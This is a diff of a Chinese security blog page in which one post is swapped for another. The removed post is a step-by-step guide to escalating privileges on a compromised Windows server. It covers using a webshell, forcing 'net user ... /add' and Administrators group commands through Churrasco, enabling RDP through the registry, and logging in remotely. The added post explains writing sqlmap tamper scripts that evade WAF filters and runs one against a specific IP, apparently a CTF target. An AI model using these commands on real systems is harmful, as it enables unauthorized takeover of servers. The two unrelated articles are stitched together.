@@ -7,21 +7,22 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
-<title>Windows服务器提权和开启3389远程连接 - Lithium</title>
+<title>sqlmap tamper 脚本编写 - Lithium</title>
 
 
-    <meta name="description" content="系统为了都有有权限管理系统，根据权限高低来决定用户在这台机器上能做的事。 比如有的文件规定了低权限用户是无法读写的，而这些文件通常是我们想要获取的敏感文件。 有的文件夹是规定不能读写的，那么我们就不能上传任何到这个文件夹，也无法从这个文件夹里运行任何程序，所以我们连接上服务器都要找一个可读可写的文件夹来继续上传我们需要的程序，如开后门的程序。 一般的网站都存储在服务器权限比较低的文件夹里， 所以即">
+    <meta name="description" content="sqlmap tamper简介sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。 使用方法： 1sqlmap.py XXXXX -tamper &quot;模块名&quot;  sqlmap脚本的tamper目录下有很多自带的tamper脚本，可以用来绕过特定的waf。 这篇文章讲的很详细：sqlmap">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Windows服务器提权和开启3389远程连接">
-<meta property="og:url" content="https://p0st3r.github.io/2017/04/20/Win-getshell-and-open-rdp/index.html">
+<meta property="og:title" content="sqlmap tamper 脚本编写">
+<meta property="og:url" content="https://p0st3r.github.io/2018/index.html">
 <meta property="og:site_name" content="Lithium">
-<meta property="og:description" content="系统为了都有有权限管理系统，根据权限高低来决定用户在这台机器上能做的事。 比如有的文件规定了低权限用户是无法读写的，而这些文件通常是我们想要获取的敏感文件。 有的文件夹是规定不能读写的，那么我们就不能上传任何到这个文件夹，也无法从这个文件夹里运行任何程序，所以我们连接上服务器都要找一个可读可写的文件夹来继续上传我们需要的程序，如开后门的程序。 一般的网站都存储在服务器权限比较低的文件夹里， 所以即">
+<meta property="og:description" content="sqlmap tamper简介sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。 使用方法： 1sqlmap.py XXXXX -tamper &quot;模块名&quot;  sqlmap脚本的tamper目录下有很多自带的tamper脚本，可以用来绕过特定的waf。 这篇文章讲的很详细：sqlmap">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://p0st3r.github.io/images/og_image.png">
-<meta property="article:published_time" content="2017-04-19T20:11:03.000Z">
-<meta property="article:modified_time" content="2019-05-09T02:08:40.276Z">
+<meta property="article:published_time" content="2018-03-21T00:22:27.000Z">
+<meta property="article:modified_time" content="2019-05-09T11:17:46.476Z">
 <meta property="article:author" content="Lithium Atom">
-<meta property="article:tag" content="getshell">
+<meta property="article:tag" content="Sql injection">
+<meta property="article:tag" content="sqlmap">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://p0st3r.github.io/images/og_image.png">
 
@@ -31,7 +32,7 @@
 
 
 
-<link rel="alternative" href="/lithium.xml" title="Windows服务器提权和开启3389远程连接" type="application/atom+xml">
+<link rel="alternative" href="/lithium.xml" title="sqlmap tamper 脚本编写" type="application/atom+xml">
 
 
 
@@ -85,7 +86,7 @@
         <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/logo.svg" alt="Windows服务器提权和开启3389远程连接" height="28">
+                <img src="/images/logo.svg" alt="sqlmap tamper 脚本编写" height="28">
             
             </a>
         </div>
@@ -138,7 +139,7 @@
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
                 <i class="fas fa-calendar-alt"></i>&nbsp;
-                <time class="level-item has-text-grey" datetime="2017-04-19T20:11:03.000Z">2017-04-20</time>
+                <time class="level-item has-text-grey" datetime="2018-03-21T00:22:27.000Z">2018-03-21</time>
                 <i class="fas fa-archive"></i>&nbsp;
                 
                 <div class="level-item">
@@ -150,7 +151,7 @@
                     
                     <i class="fas fa-clock"></i>&nbsp;
                     
-                    11 minutes read (About 1608 words)
+                    6 minutes read (About 902 words)
                 </span>
                 
                 
@@ -164,83 +165,50 @@
         
         <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
             
-                Windows服务器提权和开启3389远程连接
+                sqlmap tamper 脚本编写
             
         </h1>
         <div class="content">
-            <p>系统为了都有有权限管理系统，根据权限高低来决定用户在这台机器上能做的事。</p>
-<p>比如有的文件规定了低权限用户是无法读写的，而这些文件通常是我们想要获取的敏感文件。</p>
-<p>有的文件夹是规定不能读写的，那么我们就不能上传任何到这个文件夹，也无法从这个文件夹里运行任何程序，所以我们连接上服务器都要找一个可读可写的文件夹来继续上传我们需要的程序，如开后门的程序。</p>
-<p>一般的网站都存储在服务器权限比较低的文件夹里， 所以即使我们上传了WebShell，最多也只能够对网站所在的文件夹操作，而不能完整的控制整个服务器。所以我们需要进行提权，以一个权限相当高的用户来访问该服务器。</p>
+            <h2 id="sqlmap-tamper简介"><a href="#sqlmap-tamper简介" class="headerlink" title="sqlmap tamper简介"></a>sqlmap tamper简介</h2><p>sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。 使用方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py XXXXX -tamper &quot;模块名&quot;</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap脚本的tamper目录下有很多自带的tamper脚本，可以用来绕过特定的waf。 这篇文章讲的很详细：sqlmap的tamper详解：<a href="http://www.myh0st.cn/index.php/archives/881/">http://www.myh0st.cn/index.php/archives/881/</a></p>
 <a id="more"></a>
 
-<p>Windows中以用户组来分配权限，每个用户组有不同的权限，其中最高权限用户组是Administrators组，拥有对整个系统进行操作system权限。每个用户组下可以创建多个用户。</p>
-<p>在Win10以前的Windows系统版本中，可以通过 右键此电脑=》管理=》系统工具=》本地用户和组来查看用户组及用户组中的用户。</p>
-<h2 id=""><a href="#" class="headerlink" title=""></a><img src="v2-eb8981064ab46a0bc03f31ee70a86f2b_hd.png" alt="img"></h2><h2 id="0x01-大马和菜刀"><a href="#0x01-大马和菜刀" class="headerlink" title="0x01 大马和菜刀"></a>0x01 大马和菜刀</h2><p>我试过各种大马，功能其实都大同小异，不过不知道是不是我使用的原因，里面的cmd并不怎么好用。大马里我个人觉得最有用的就是查看文件权限属性的功能，这个使我们在找后门上传点的时候是非常好用的，并且这个功能在菜刀里是没有的。</p>
-<p>这种php大马可以在Perms项下看到文件的读写权限属性。 </p>
-<p><img src="v2-2fcc71a8ada61d4e72901ab183efe4ec_hd.png" alt="img"></p>
-<p>而菜刀比较好的的就是比较适合人类查看的文件目录界面，和虚拟终端。所以通常将两者结合起来用。右键任意可执行文件打开虚拟终端。 </p>
-<h2 id="0x02-巴西烤肉提权"><a href="#0x02-巴西烤肉提权" class="headerlink" title="0x02 巴西烤肉提权"></a><img src="v2-18be9bbfd3f9c9b66d97b4a376774239_hd.png" alt="img">0x02 巴西烤肉提权</h2><p>创建系统用户的命令如下：</p>
+<h2 id="lowercase-py"><a href="#lowercase-py" class="headerlink" title="lowercase.py"></a>lowercase.py</h2><p>我们从sqlmap自带的escapequotes.py了解tamper的结构。 这个脚本的作用是将单引号转换成 \‘ ，双引号转换成 \“ ，用于过滤了单引号或双引号的情况</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE'</span></span><br><span class="line"><span class="string">for copying permission"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">	<span class="string">""" Slash escape single and double quotes (e.g. ' -&gt; \')</span></span><br><span class="line"><span class="string">	&gt;&gt;&gt; tamper('1" AND SLEEP(5)#')</span></span><br><span class="line"><span class="string">	'1\\\\" AND SLEEP(5)#'</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	<span class="keyword">return</span> payload.replace(<span class="string">"'"</span>,<span class="string">"\\'"</span>).replace(<span class="string">'"'</span>, <span class="string">'\\"'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到tamper脚本的基本结构为 priority 变量定义和 dependencies 、 tamper 函数定义。</p>
 <ul>
-<li>新建一个用户 </li>
+<li><code>priority</code> 定义脚本的优先级，用于有多个tamper脚本的情况。</li>
+<li><code>dependencies</code> 函数声明该脚本适用或不适用的范围，可以为空。</li>
+<li><code>tamper</code> 是主要的函数，接受的参数为 <code>payload</code> 和 <code>**kwargs</code> ，返回值为替换后的payload。</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user [username] [password] &#x2F;add</span><br></pre></td></tr></table></figure>
+<h2 id="priority"><a href="#priority" class="headerlink" title="priority"></a>priority</h2><p>在自带的tamper脚本中一共有以下几种优先级 还可以自定义 <code>-100~100</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__priority__ &#x3D; PRIORITY.LOWEST</span><br><span class="line">__priority__ &#x3D; PRIORITY.LOWER</span><br><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br><span class="line">__priority__ &#x3D; PRIORITY.NORMAL</span><br><span class="line">__priority__ &#x3D; PRIORITY.HIGH</span><br><span class="line">__priority__ &#x3D; PRIORITY.HIGHER</span><br><span class="line">__priority__ &#x3D; PRIORITY.HIGHEST</span><br></pre></td></tr></table></figure>
 
-<ul>
-<li>添加到Administrators用户组</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Administrators [username] &#x2F;add</span><br></pre></td></tr></table></figure>
+<h2 id="dependencies函数"><a href="#dependencies函数" class="headerlink" title="dependencies函数"></a>dependencies函数</h2><p><code>dependencies</code> 函数，对tamper脚本支持/不支持使用的环境进行声明，可以为空，如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os <span class="keyword">from</span> lib.core.common</span><br><span class="line"><span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">	singleTimeWarnMessage(<span class="string">"tamper script '%s' is only meant to be run against %s"</span> %</span><br><span class="line">(os.path.basename(__file__).split(<span class="string">"."</span>)[<span class="number">0</span>], DBMS.ACCESS))</span><br><span class="line"><span class="comment">#singleTimeWarnMessage() 用于在控制台中打印出警告信息</span></span><br></pre></td></tr></table></figure>
 
-<ul>
-<li>激活用户</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user [username] &#x2F;active:yes</span><br></pre></td></tr></table></figure>
+<h2 id="tamper函数"><a href="#tamper函数" class="headerlink" title="tamper函数"></a>tamper函数</h2><p>tamper是整个脚本的主体。主要用于修改原本的payload，返回值为替换后的payload。 比如Kzone中通过Unicode编码关键字中的字符来绕过waf。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">	payload = payload.lower()</span><br><span class="line">	payload = payload.replace(<span class="string">'u'</span>, <span class="string">'u0075'</span>)</span><br><span class="line">	payload = payload.replace(<span class="string">'o'</span>, <span class="string">'u006f'</span>)</span><br><span class="line">	payload = payload.replace(<span class="string">'i'</span>, <span class="string">'u0069'</span>)</span><br><span class="line">	payload = payload.replace(<span class="string">''', 'u0027')</span></span><br><span class="line"><span class="string">	payload = payload.replace('"', 'u0022')</span></span><br><span class="line"><span class="string">	payload = payload.replace(' ', 'u0020')</span></span><br><span class="line"><span class="string">	payload = payload.replace('s', 'u0073')</span></span><br><span class="line"><span class="string">	payload = payload.replace('#', 'u0023')</span></span><br><span class="line"><span class="string">	payload = payload.replace('&gt;', 'u003e')</span></span><br><span class="line"><span class="string">	payload = payload.replace('&lt;', 'u003c')</span></span><br><span class="line"><span class="string">	payload = payload.replace('-', 'u002d')</span></span><br><span class="line"><span class="string">	payload = payload.replace('=', 'u003d')</span></span><br><span class="line"><span class="string">	return payload</span></span><br></pre></td></tr></table></figure>
 
-<p>由于一般网站被放在服务器中权限比较低的文件夹中，因此直接创建Administrator用户的命令是不被执行的。</p>
-<p>巴西烤肉是一个非常强劲的程序，它可以无视拒绝强制执行cmd命令，经常被用到提权中。</p>
-<p>我们通过菜刀将cmd.exe和巴西烤肉上传到网站文件夹中。</p>
-<p><img src="v2-0d4983673f80086b2a185b50d42e40d5_hd.png" alt="img"></p>
-<p>然后右键cmd.exe打开虚拟终端，先将终端路径设置为我们自己上传的cmd.exe，再尝试直接创建用户，报错命令被拒绝执行。（其实这里是一个Ubuntu Linux服务器）</p>
-<p><img src="v2-6c9679f163c06cb6d6a73a7aa38f17de_hd.png" alt="img"></p>
-<p><img src="v2-7a965148c3cbc5a7bc19695203fac9e8_hd.png" alt="img"></p>
-<p>====================================================================== </p>
-<p>由于后来没找到Windows服务器的网站模板，因此下面就不带图了，过程全部手打还原，谅解</p>
-<p>======================================================================</p>
-<p>先将终端路径设置为我们自己上传的cmd.exe</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SETP ..&#x2F;..&#x2F;www&#x2F;uploads&#x2F;cmd.exe</span><br></pre></td></tr></table></figure>
+<h2 id="kwargs"><a href="#kwargs" class="headerlink" title="kwargs"></a>kwargs</h2><p>在官方提供的47个tamper脚本中，kwargs参数只被使用了两次，两次都只是更改了http-header</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sqlmap/tamper/vanrish.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">	headers = kwargs.get(<span class="string">"headers"</span>, &#123;&#125;)</span><br><span class="line">	headers[<span class="string">"X-originating-IP"</span>] = <span class="string">"127.0.0.1"</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
 
-<p>再用巴西烤肉强制执行命令。巴西烤肉语法：Churrasco.exe “your command”</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Chu.exe &quot;net user [username] [password] &#x2F;add &amp; net localgroup Administrators [username] &#x2F;add&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>恰当的使用或者编写特定的tamper脚本能够省去很多不必要的麻烦。 且编写tamper时几乎所有的sqlmap内置的<br>函数、变量都可以使用 如 <code>__priority__=PRIORITY.LOWER</code> 来源于 <code>sqlmap/lib/core/enums.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE'</span></span><br><span class="line"><span class="string">for copying permission</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PRIORITY</span>:</span></span><br><span class="line">	LOWEST = <span class="number">-100</span></span><br><span class="line">	LOWER = <span class="number">-50</span></span><br><span class="line">	LOW = <span class="number">-10</span></span><br><span class="line">	NORMAL = <span class="number">0</span></span><br><span class="line">	HIGH = <span class="number">10</span></span><br><span class="line">	HIGHER = <span class="number">50</span></span><br><span class="line">	HIGHEST = <span class="number">100</span></span><br><span class="line">....</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">DBMS</span>:</span></span><br><span class="line">	ACCESS = <span class="string">"Microsoft Access"</span></span><br><span class="line">	DB2 = <span class="string">"IBM DB2"</span></span><br><span class="line">	FIREBIRD = <span class="string">"Firebird"</span></span><br><span class="line">	MAXDB = <span class="string">"SAP MaxDB"</span></span><br><span class="line">	MSSQL = <span class="string">"Microsoft SQL Server"</span></span><br><span class="line">	MYSQL = <span class="string">"MySQL"</span></span><br><span class="line">	ORACLE = <span class="string">"Oracle"</span></span><br><span class="line">	PGSQL = <span class="string">"PostgreSQL"</span></span><br><span class="line">	SQLITE = <span class="string">"SQLite"</span></span><br><span class="line">	SYBASE = <span class="string">"Sybase"</span></span><br><span class="line">	HSQLDB = <span class="string">"HSQLDB"</span></span><br><span class="line">	INFORMIX = <span class="string">"Informix"</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DBMS_DIRECTORY_NAME</span>:</span></span><br><span class="line">	ACCESS = <span class="string">"access"</span></span><br><span class="line">	DB2 = <span class="string">"db2"</span></span><br><span class="line">	FIREBIRD = <span class="string">"firebird"</span></span><br><span class="line">	MAXDB = <span class="string">"maxdb"</span></span><br><span class="line">	MSSQL = <span class="string">"mssqlserver"</span></span><br><span class="line">	MYSQL = <span class="string">"mysql"</span></span><br><span class="line">	ORACLE = <span class="string">"oracle"</span></span><br><span class="line">	PGSQL = <span class="string">"postgresql"</span></span><br><span class="line">	SQLITE = <span class="string">"sqlite"</span></span><br><span class="line">	SYBASE = <span class="string">"sybase"</span></span><br><span class="line">	HSQLDB = <span class="string">"hsqldb"</span></span><br><span class="line">	INFORMIX = <span class="string">"informix"</span></span><br></pre></td></tr></table></figure>
 
-<p>若无报错，那么我们就已经成为系统管理员账户了。查看当前用户会发现我们创建的用户：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>一个替换关键字为空的waf</p>
+<p><img src="1.jpg" alt="1557361917185"></p>
+<p>不使用脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python27 sqlmap.py -u &quot;http:&#x2F;&#x2F;47.106.142.99:8008&#x2F;list.php?id&#x3D;1&quot; -D ctf --tables</span><br></pre></td></tr></table></figure>
 
-<p>至此，我们已经创建了超级权限的用户，已经可以对整个服务器进行操作了。但是在终端里操作总有些不方便，下面我们介绍一下拿下权限后如何远程连接进行桌面操作。</p>
-<h2 id="0x03-3389端口服务"><a href="#0x03-3389端口服务" class="headerlink" title="0x03 3389端口服务"></a>0x03 3389端口服务</h2><p>远程桌面协议（RDP, Remote Desktop Protocol）是一个多通道（multi-channel）的协议，让用户（客户端或称“本地电脑”）连上提供微软终端机服务的电脑（服务器端或称“远程电脑”）。大部分的Windows都有客户端所需软件。服务端电脑方面，<strong>默认听取送到TCP3389端口的数据</strong>。【百度百科】</p>
-<p>这是一种非常方便的对服务器的操作方式，一般的网站管理员都会开启3389端口远程桌面服务。而有的安全素养比较高的管理员则会选择将3389端口关闭，甚至开启防火墙禁止任何开启3389的操作。</p>
-<p><em>闲扯一下，最近Shadow Broker泄露的NSA的工具，内网里开3389的服务器一打一个准，有空的可以去玩玩。misterch0c/shadowbroker</em> </p>
-<p>在无防火墙的情况下，我们可以用cmd命令来添加注册表开启3389端口，或者使用别人留下的工具。</p>
-<ul>
-<li>cmd命令</li>
-</ul>
-<p>将以下命令写入一个.bat文件，将其拖入服务器可读写目录执行，即可开启3389端口。</p>
-<p>此种对Windows XP 和2003系统有用，不用重起</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure>
+<p><img src="2.jpg" alt="2"></p>
+<p>编写脚本 test.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE'</span></span><br><span class="line"><span class="string">for copying permission</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">	payload=payload.lower()</span><br><span class="line">	payload=payload.replace(<span class="string">'/*'</span>,<span class="string">'//**'</span>)</span><br><span class="line">	payload=payload.replace(<span class="string">'select'</span>,<span class="string">'SeLselecteCt'</span>)</span><br><span class="line">	payload=payload.replace(<span class="string">'union'</span>,<span class="string">'UnunionIoN'</span>)</span><br><span class="line">	payload=payload.replace(<span class="string">'and'</span>,<span class="string">'Anandd'</span>)</span><br><span class="line">	payload=payload.replace(<span class="string">'sleep'</span>,<span class="string">'SlesleepEp'</span>)</span><br><span class="line">	payload=payload.replace(<span class="string">'or'</span>,<span class="string">'oorr'</span>)</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">python27 sqlmap.py -u <span class="string">"http://47.106.142.99:8008/list.php?id=1"</span> --tamper=test -D ctf --</span><br><span class="line">tables</span><br></pre></td></tr></table></figure>
 
-<ul>
-<li><p>写好的程序</p>
-<p><img src="v2-c1f967bb47989b9824e01b78f35b8281_hd.png" alt="img"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Chu.exe &quot;kai3389.exe&quot;</span><br></pre></td></tr></table></figure>
-
-<p>就行了</p>
-</li>
-</ul>
-<p><em>在有防火墙的情况下，需将防火墙先关闭，再用lcx.exe将3389映射到其他端口上，这个等我搞懂了再写。</em></p>
-<h2 id="0x04-RDP远程桌面连接"><a href="#0x04-RDP远程桌面连接" class="headerlink" title="0x04 RDP远程桌面连接"></a>0x04 RDP远程桌面连接</h2><p>创建好用户，开启远程桌面功能，就可以用此用户远程登陆别人的服务器直接进行桌面操作，岂不是美滋滋。</p>
-<p>Win+R 打开【运行】窗口，运行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstsc &#x2F;admin</span><br></pre></td></tr></table></figure>
-
-<p>用直接创建的用户名和密码登录，OK。</p>
+<p><img src="3.jpg" alt="3"></p>
 
         </div>
         
@@ -248,7 +216,7 @@
             <div class="level-start">
                 <div class="level-item">
                     <span class="is-size-6 has-text-grey has-mr-7">#</span>
-                    <a class="has-link-grey -link" href="/tags/getshell/" rel="tag">getshell</a>
+                    <a class="has-link-grey -link" href="/tags/Sql-injection/" rel="tag">Sql injection</a>, <a class="has-link-grey -link" href="/tags/sqlmap/" rel="tag">sqlmap</a>
                 </div>
             </div>
         </div>
@@ -299,16 +267,16 @@
     <div class="level post-navigation is-flex-wrap is-mobile">
         
         <div class="level-start">
-            <a class="level level-item has-link-grey  article-nav-prev" href="/2017/04/28/NSA-tools/">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2018/">
                 <i class="level-item fas fa-chevron-left"></i>
-                <span class="level-item">NSA方程式工具利用与分析</span>
+                <span class="level-item">CTF中RSA的常见攻击方法</span>
             </a>
         </div>
         
         
         <div class="level-end">
-            <a class="level level-item has-link-grey  article-nav-next" href="/2017/02/06/DVWA-SQL-injection-test/">
-                <span class="level-item">DVWA的SQL注入测试</span>
+            <a class="level level-item has-link-grey  article-nav-next" href="/2017/">
+                <span class="level-item">MS08-067漏洞原理分析及还原</span>
                 <i class="level-item fas fa-chevron-right"></i>
             </a>
         </div>
@@ -383,7 +351,7 @@
                     </p>
                     <a href="/archives">
                         <p class="title has-text-weight-normal">
-                            12
+                            13
                         </p>
                     </a>
                 </div>
@@ -395,7 +363,7 @@
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
-                            6
+                            7
                         </p>
                     </a>
                 </div>
@@ -465,25 +433,37 @@
                     Catalogue
                 </h3>
                 <ul class="menu-list"><li>
-        <a class="is-flex" href="#">
+        <a class="is-flex" href="#sqlmap-tamper简介">
         <span class="has-mr-6">1</span>
-        <span></span>
+        <span>sqlmap tamper简介</span>
         </a></li><li>
-        <a class="is-flex" href="#0x01-大马和菜刀">
+        <a class="is-flex" href="#lowercase-py">
         <span class="has-mr-6">2</span>
-        <span>0x01 大马和菜刀</span>
+        <span>lowercase.py</span>
         </a></li><li>
-        <a class="is-flex" href="#0x02-巴西烤肉提权">
+        <a class="is-flex" href="#priority">
         <span class="has-mr-6">3</span>
-        <span>0x02 巴西烤肉提权</span>
+        <span>priority</span>
         </a></li><li>
-        <a class="is-flex" href="#0x03-3389端口服务">
+        <a class="is-flex" href="#dependencies函数">
         <span class="has-mr-6">4</span>
-        <span>0x03 3389端口服务</span>
+        <span>dependencies函数</span>
         </a></li><li>
-        <a class="is-flex" href="#0x04-RDP远程桌面连接">
+        <a class="is-flex" href="#tamper函数">
         <span class="has-mr-6">5</span>
-        <span>0x04 RDP远程桌面连接</span>
+        <span>tamper函数</span>
+        </a></li><li>
+        <a class="is-flex" href="#kwargs">
+        <span class="has-mr-6">6</span>
+        <span>kwargs</span>
+        </a></li><li>
+        <a class="is-flex" href="#结语">
+        <span class="has-mr-6">7</span>
+        <span>结语</span>
+        </a></li><li>
+        <a class="is-flex" href="#实例">
+        <span class="has-mr-6">8</span>
+        <span>实例</span>
         </a></li></ul>
             </div>
         </div>
@@ -500,8 +480,21 @@
             
             <div class="media-content">
                 <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-02-25T14:00:48.000Z">2020-02-25</time></div>
+                    <a href="/2020/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Reading notes of &lt;Machine Learning&gt; Chapter2</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Machine-Learning/">Machine Learning</a> / <a class="has-link-grey -link" href="/categories/Machine-Learning/Model-evaluation-and-selection/">Model evaluation and selection</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
                     <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-02-25T09:00:22.000Z">2020-02-25</time></div>
